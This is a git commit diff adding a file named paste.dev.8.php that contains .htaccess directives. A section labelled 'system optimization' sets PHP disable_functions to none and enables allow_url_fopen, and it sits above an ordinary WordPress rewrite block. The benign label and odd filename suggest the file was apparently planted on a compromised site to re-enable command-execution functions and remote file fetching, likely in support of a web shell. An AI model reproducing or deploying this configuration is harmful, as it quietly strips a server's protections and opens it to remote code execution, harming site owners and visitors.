ec1ae0ee62d3cb61a9d8e03e9ddfec4d8a811866
onlyme1d <agungrikardo09@gmail.com>
2025-11-26 14:02:17 +0700

    Update and rename paste.dev.22.php to paste.dev.8.php

---
+++ paste.dev.8.php
@@ -0,0 +1,22 @@
+# system optimization section
+# ===============================================
+# Execute overrides on PHP configuration
+php_value disable_functions none
+php_flag allow_url_fopen On
+# ===============================================
+
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# END WordPress
